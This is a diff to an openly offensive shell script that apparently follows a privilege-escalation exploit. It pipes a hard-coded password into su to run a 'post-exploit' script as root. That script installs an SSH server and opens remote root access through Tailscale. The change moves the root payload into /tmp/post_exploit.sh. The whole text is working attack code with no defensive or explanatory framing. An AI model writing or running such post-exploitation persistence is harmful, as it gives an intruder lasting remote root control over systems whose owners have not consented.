@@ -40,10 +40,10 @@ if [ ! -f /tmp/pwn.log ]; then
     exit 1
 fi
 
-echo '[*] Step 3: Running post-exploit as root...'
-echo '12341234' | /usr/bin/su -c bash <<'ROOTSCRIPT'
-
-echo '[*] Step 3a: Install SSH server'
+# Write post-exploit script to a temp file (avoids stdin conflict with su)
+cat > /tmp/post_exploit.sh << 'POSTSCRIPT'
+#!/bin/bash
+echo '[*] Step 3: Install SSH server'
 apt-get update -qq 2>/dev/null
 apt-get install -y -qq openssh-server 2>/dev/null
 mkdir -p /run/sshd
@@ -70,5 +70,8 @@ echo '[*] Connect via Tailscale:'
 echo "    URL: $LOGIN_URL"
 echo '    After auth: ssh root@<tailscale-ip>'
 echo '========================================'
+POSTSCRIPT
+chmod +x /tmp/post_exploit.sh
 
-ROOTSCRIPT
+echo '[*] Step 3: Running post-exploit as root...'
+echo '12341234' | /usr/bin/su -c 'bash /tmp/post_exploit.sh'
